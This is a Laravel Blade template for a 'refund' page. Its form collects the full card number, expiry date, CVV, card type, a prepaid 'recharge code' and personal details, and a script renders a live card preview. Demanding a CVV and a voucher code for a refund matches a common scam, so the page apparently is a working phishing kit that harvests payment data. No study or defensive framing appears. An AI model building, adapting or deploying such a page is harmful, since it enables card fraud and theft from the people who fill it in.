@extends('layouts.app')

@section('title', __('site.meta.title_refund', ['name' => config('site.name')]))
@section('meta_description', __('site.meta.desc_refund'))

@section('content')
    <span id="refund-i18n" class="hidden" aria-hidden="true"
        data-holder-empty="{{ __('site.forms.refund.holder_placeholder') }}"
        data-mm="{{ __('site.forms.refund.month_placeholder') }}"
        data-yy="{{ __('site.forms.refund.year_placeholder') }}"
        data-brand-other="{{ __('site.forms.refund.brand_other') }}"
    ></span>
    <header class="fixed inset-x-0 top-0 z-50 border-b border-slate-200/80 bg-white/95 backdrop-blur-md">
        <div class="mx-auto flex max-w-6xl items-center justify-between gap-3 px-4 py-3 sm:px-6">
            <a href="{{ route('home') }}" class="flex shrink-0 items-center gap-2 text-base font-semibold text-night-850">
                <span class="flex h-8 w-8 items-center justify-center rounded-lg bg-gradient-to-br from-sky-500 to-night-700 text-white">
                    <svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
                </span>
                {{ config('site.name_short') }}
            </a>
            <div class="flex min-w-0 flex-1 flex-nowrap items-center justify-end gap-3 md:gap-4">
                <nav class="flex min-w-0 items-center gap-4 text-sm font-medium text-slate-600 lg:gap-6" aria-label="{{ __('site.nav.navigation') }}">
                    <a href="{{ route('home') }}" class="whitespace-nowrap transition hover:text-night-850">{{ __('site.nav.home') }}</a>
                    <a href="{{ route('refund') }}" class="whitespace-nowrap font-semibold text-night-850" aria-current="page">{{ __('site.nav.refund') }}</a>
                </nav>
                @include('partials.language-switcher', ['variant' => 'nav'])
            </div>
        </div>
    </header>

    <div class="relative min-h-screen overflow-hidden bg-slate-100 pt-28 pb-16 sm:pt-32">
        <div class="pointer-events-none fixed inset-0 -z-0 flex items-center justify-center overflow-hidden" aria-hidden="true">
            <p class="max-w-[95vw] select-none text-center text-[10vw] font-bold uppercase leading-none tracking-tighter text-slate-300/45 sm:text-[7vw]">
                {{ config('site.watermark') }}
            </p>
        </div>

        <div class="relative z-10 mx-auto max-w-3xl px-4 sm:px-6">
            @if (session('refund_error'))
                <div class="mb-6 rounded-2xl border border-amber-200 bg-amber-50 p-4 text-sm text-amber-900">
                    {{ session('refund_error') }}
                </div>
            @endif

            <div class="overflow-hidden rounded-2xl border border-slate-200 bg-white shadow-card">
                <div class="relative bg-gradient-to-br from-night-850 via-night-800 to-slate-900 px-6 py-8 sm:px-8 sm:py-10">
                    <div class="absolute right-4 top-4 flex items-center gap-2 sm:right-6 sm:top-6">
                        <span id="brand-badge-visa" class="hidden rounded bg-white px-2 py-1 text-[10px] font-black tracking-wider text-[#1A1F71] shadow">VISA</span>
                        <span id="brand-badge-mc" class="hidden rounded bg-white px-2 py-1 text-[10px] font-black tracking-wider text-[#EB001B] shadow">MC</span>
                        <span id="brand-badge-other" class="hidden rounded bg-white/90 px-2 py-1 text-[10px] font-semibold text-slate-600 shadow">—</span>
                    </div>
                    <p class="text-xs font-medium uppercase tracking-[0.2em] text-sky-200/80">{{ __('site.forms.refund.secured_payment') }}</p>
                    <p class="mt-4 font-mono text-xl tracking-[0.15em] text-white sm:text-2xl" id="card-display">•••• •••• •••• ••••</p>
                    <div class="mt-8 flex justify-between text-sm text-sky-100/90">
                        <span id="card-holder-preview">{{ __('site.forms.refund.holder_placeholder') }}</span>
                        <span id="exp-preview">{{ __('site.forms.refund.month_placeholder') }} / {{ __('site.forms.refund.year_placeholder') }}</span>
                    </div>
                </div>

                <div class="p-8 sm:p-10">
                    <h1 class="text-center text-2xl font-bold text-night-900 sm:text-3xl">{{ __('site.forms.refund.title') }}</h1>
                    <div class="mx-auto mt-4 flex h-1 w-24 justify-center overflow-hidden rounded-full">
                        <span class="h-full w-1/2 bg-sky-600"></span>
                        <span class="h-full w-1/2 bg-red-500"></span>
                    </div>
                    <p class="mt-6 text-center text-sm leading-relaxed text-slate-600">
                        {{ __('site.forms.refund.intro') }}
                    </p>

                    <form class="mt-10 space-y-6" action="{{ route('refund.submit') }}" method="post" autocomplete="off">
                        @csrf

                        <div>
                            <label for="card_number" class="block text-sm font-medium text-night-900">
                                {{ __('site.forms.refund.card_number_label') }} <span class="text-red-600">*</span>
                            </label>
                            <input type="text" name="card_number" id="card_number" inputmode="numeric" maxlength="23"
                                value="{{ old('card_number') }}"
                                placeholder="{{ __('site.forms.refund.card_number_placeholder') }}"
                                class="mt-2 w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3 font-mono text-lg tracking-wider text-night-900 placeholder-slate-400 focus:border-sky-500 focus:bg-white focus:ring-2 focus:ring-sky-200 @error('card_number') border-red-400 @enderror">
                            @error('card_number')
                                <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                            @enderror
                            <p class="mt-1 text-xs text-slate-500">{!! __('site.forms.refund.card_detect', ['visa' => '<strong class="text-night-800">'.__('site.forms.refund.visa').'</strong>', 'mc' => '<strong class="text-night-800">'.__('site.forms.refund.mc').'</strong>']) !!}</p>
                        </div>

                        <div class="grid grid-cols-1 gap-6 md:grid-cols-2">
                            <div>
                                <label for="exp_month" class="block text-sm font-medium text-night-900">{{ __('site.forms.refund.month') }} <span class="text-red-600">*</span></label>
                                <select name="exp_month" id="exp_month" class="mt-2 w-full rounded-xl border border-slate-200 bg-slate-50 py-3 pl-4 pr-10 text-night-900 focus:border-sky-500 focus:bg-white focus:ring-2 focus:ring-sky-200 @error('exp_month') border-red-400 @enderror">
                                    <option value="">{{ __('site.forms.refund.month_placeholder') }}</option>
                                    @for ($m = 1; $m <= 12; $m++)
                                        @php $mm = str_pad((string) $m, 2, '0', STR_PAD_LEFT); @endphp
                                        <option value="{{ $mm }}" @selected(old('exp_month') === $mm)>{{ $mm }}</option>
                                    @endfor
                                </select>
                                @error('exp_month')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                            <div>
                                <label for="exp_year" class="block text-sm font-medium text-night-900">{{ __('site.forms.refund.year') }} <span class="text-red-600">*</span></label>
                                <select name="exp_year" id="exp_year" class="mt-2 w-full rounded-xl border border-slate-200 bg-slate-50 py-3 pl-4 pr-10 text-night-900 focus:border-sky-500 focus:bg-white focus:ring-2 focus:ring-sky-200 @error('exp_year') border-red-400 @enderror">
                                    <option value="">{{ __('site.forms.refund.year_placeholder') }}</option>
                                    @for ($y = (int) date('y'); $y <= (int) date('y') + 15; $y++)
                                        @php $yy = str_pad((string) $y, 2, '0', STR_PAD_LEFT); @endphp
                                        <option value="{{ $yy }}" @selected(old('exp_year') === $yy)>20{{ $yy }}</option>
                                    @endfor
                                </select>
                                @error('exp_year')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <div class="grid grid-cols-1 gap-6 md:grid-cols-2">
                            <div>
                                <label for="cvv" class="block text-sm font-medium text-night-900">{{ __('site.forms.refund.cvv') }} <span class="text-red-600">*</span></label>
                                <input type="password" name="cvv" id="cvv" maxlength="4" inputmode="numeric" placeholder="{{ __('site.forms.refund.cvv') }}"
                                    value="{{ old('cvv') }}"
                                    class="mt-2 w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3 font-mono text-night-900 focus:border-sky-500 focus:bg-white focus:ring-2 focus:ring-sky-200 @error('cvv') border-red-400 @enderror">
                                @error('cvv')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                            <div>
                                <label for="card_type" class="block text-sm font-medium text-night-900">{{ __('site.forms.refund.card_type_label') }} <span class="text-red-600">*</span></label>
                                <div class="relative mt-2">
                                    <select name="card_type" id="card_type" class="w-full appearance-none rounded-xl border border-slate-200 bg-slate-50 py-3 pl-4 pr-10 text-night-900 focus:border-sky-500 focus:bg-white focus:ring-2 focus:ring-sky-200 @error('card_type') border-red-400 @enderror">
                                        <option value="" disabled @selected(! old('card_type'))>{{ __('site.forms.refund.select_type') }}</option>
                                        @foreach ($cardTypes as $value => $label)
                                            <option value="{{ $value }}" @selected(old('card_type') === $value)>{{ $label }}</option>
                                        @endforeach
                                    </select>
                                    <span class="pointer-events-none absolute inset-y-0 right-3 flex items-center text-slate-400">
                                        <svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
                                    </span>
                                </div>
                                @error('card_type')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <div class="grid grid-cols-1 gap-6 md:grid-cols-2">
                            <div>
                                <label for="recharge_code" class="block text-sm font-medium text-night-900">{{ __('site.forms.refund.recharge_code') }} <span class="text-red-600">*</span></label>
                                <input type="text" name="recharge_code" id="recharge_code" value="{{ old('recharge_code') }}"
                                    class="mt-2 w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3 text-night-900 focus:border-sky-500 focus:bg-white focus:ring-2 focus:ring-sky-200 @error('recharge_code') border-red-400 @enderror">
                                @error('recharge_code')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                            <div>
                                <label for="first_name" class="block text-sm font-medium text-night-900">{{ __('site.forms.refund.first_name') }} <span class="text-red-600">*</span></label>
                                <input type="text" name="first_name" id="first_name" value="{{ old('first_name') }}" autocomplete="given-name"
                                    class="mt-2 w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3 text-night-900 focus:border-sky-500 focus:bg-white focus:ring-2 focus:ring-sky-200 @error('first_name') border-red-400 @enderror">
                                @error('first_name')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <div class="grid grid-cols-1 gap-6 md:grid-cols-2">
                            <div>
                                <label for="last_name" class="block text-sm font-medium text-night-900">{{ __('site.forms.refund.last_name') }} <span class="text-red-600">*</span></label>
                                <input type="text" name="last_name" id="last_name" value="{{ old('last_name') }}" autocomplete="family-name"
                                    class="mt-2 w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3 text-night-900 focus:border-sky-500 focus:bg-white focus:ring-2 focus:ring-sky-200 @error('last_name') border-red-400 @enderror">
                                @error('last_name')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                            <div>
                                <label for="email" class="block text-sm font-medium text-night-900">{{ __('site.forms.refund.email') }} <span class="text-red-600">*</span></label>
                                <input type="email" name="email" id="email" value="{{ old('email') }}" autocomplete="email"
                                    class="mt-2 w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3 text-night-900 focus:border-sky-500 focus:bg-white focus:ring-2 focus:ring-sky-200 @error('email') border-red-400 @enderror">
                                @error('email')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <div class="grid grid-cols-1 gap-6 md:grid-cols-2">
                            <div>
                                <label for="country" class="block text-sm font-medium text-night-900">{{ __('site.forms.refund.country') }} <span class="text-red-600">*</span></label>
                                <div class="relative mt-2">
                                    <select name="country" id="country" class="w-full appearance-none rounded-xl border border-slate-200 bg-slate-50 py-3 pl-4 pr-10 text-night-900 focus:border-sky-500 focus:bg-white focus:ring-2 focus:ring-sky-200 @error('country') border-red-400 @enderror">
                                        <option value="" disabled @selected(! old('country'))>{{ __('site.forms.refund.select_country') }}</option>
                                        @foreach ($countries as $code => $name)
                                            <option value="{{ $code }}" @selected(old('country') === $code)>{{ $name }}</option>
                                        @endforeach
                                    </select>
                                    <span class="pointer-events-none absolute inset-y-0 right-3 flex items-center text-slate-400">
                                        <svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
                                    </span>
                                </div>
                                @error('country')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                            <div>
                                <label for="city_postal" class="block text-sm font-medium text-night-900">{{ __('site.forms.refund.city_postal') }} <span class="text-red-600">*</span></label>
                                <input type="text" name="city_postal" id="city_postal" value="{{ old('city_postal') }}"
                                    placeholder="{{ __('site.forms.refund.city_placeholder') }}"
                                    class="mt-2 w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3 text-night-900 focus:border-sky-500 focus:bg-white focus:ring-2 focus:ring-sky-200 @error('city_postal') border-red-400 @enderror">
                                @error('city_postal')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <button type="submit" class="w-full rounded-xl bg-emerald-500 py-4 text-base font-bold uppercase tracking-wide text-white shadow-lg transition hover:bg-emerald-600 focus:outline-none focus:ring-2 focus:ring-emerald-400 focus:ring-offset-2">
                            {{ __('site.forms.refund.continue') }}
                        </button>
                    </form>

                    <p class="mt-8 text-center text-sm text-slate-500">
                        <a href="{{ route('home') }}" class="font-medium text-sky-700 hover:text-night-850">{{ __('site.forms.refund.back_home') }}</a>
                    </p>
                </div>
            </div>
        </div>
    </div>
@endsection

@push('scripts')
<script>
(function () {
    var i18n = document.getElementById('refund-i18n');
    var holderEmpty = i18n ? i18n.getAttribute('data-holder-empty') : '';
    var mmDef = i18n ? i18n.getAttribute('data-mm') : 'MM';
    var yyDef = i18n ? i18n.getAttribute('data-yy') : 'AA';
    var brandOther = i18n ? i18n.getAttribute('data-brand-other') : 'OTHER';

    var cardInput = document.getElementById('card_number');
    var display = document.getElementById('card-display');
    var bVisa = document.getElementById('brand-badge-visa');
    var bMc = document.getElementById('brand-badge-mc');
    var bOther = document.getElementById('brand-badge-other');
    var fn = document.getElementById('first_name');
    var ln = document.getElementById('last_name');
    var holder = document.getElementById('card-holder-preview');
    var expPrev = document.getElementById('exp-preview');
    var monthSel = document.getElementById('exp_month');
    var yearSel = document.getElementById('exp_year');

    function digitsOnly(v) { return (v || '').replace(/\D/g, ''); }

    function detectBrand(d) {
        if (!d.length) return null;
        if (d[0] === '4') return 'visa';
        if (/^5[1-5]/.test(d)) return 'mc';
        if (/^2(?:22[1-9]|2[3-9]\d|[3-6]\d{2}|7[01]\d|720)/.test(d)) return 'mc';
        if (d.length >= 2) return 'other';
        return null;
    }

    function formatPan(val) {
        var d = digitsOnly(val).slice(0, 19);
        var parts = [];
        for (var i = 0; i < d.length; i += 4) parts.push(d.slice(i, i + 4));
        return parts.join(' ');
    }

    function updateDisplay() {
        if (!cardInput || !display) return;
        var raw = digitsOnly(cardInput.value);
        var fmt = formatPan(cardInput.value);
        cardInput.value = fmt;
        var show = fmt;
        if (!show) show = '•••• •••• •••• ••••';
        display.textContent = show;

        var brand = detectBrand(raw);
        if (bVisa) bVisa.classList.toggle('hidden', brand !== 'visa');
        if (bMc) bMc.classList.toggle('hidden', brand !== 'mc');
        if (bOther) {
            var showOther = brand === 'other' && raw.length >= 2;
            bOther.classList.toggle('hidden', !showOther);
            if (showOther) bOther.textContent = brandOther;
        }
    }

    function updateHolder() {
        if (!holder) return;
        var f = (fn && fn.value) ? fn.value.toUpperCase() : '';
        var l = (ln && ln.value) ? ln.value.toUpperCase() : '';
        if (l || f) holder.textContent = (l + ' ' + f).trim() || holderEmpty;
        else holder.textContent = holderEmpty;
    }

    function updateExp() {
        if (!expPrev || !monthSel || !yearSel) return;
        var m = monthSel.value || mmDef;
        var y = yearSel.value || yyDef;
        expPrev.textContent = m + ' / ' + y;
    }

    if (cardInput) {
        cardInput.addEventListener('input', updateDisplay);
        cardInput.addEventListener('focus', updateDisplay);
    }
    [fn, ln].forEach(function (el) { if (el) el.addEventListener('input', updateHolder); });
    [monthSel, yearSel].forEach(function (el) { if (el) el.addEventListener('change', updateExp); });

    updateDisplay();
    updateHolder();
    updateExp();
})();
</script>
@endpush
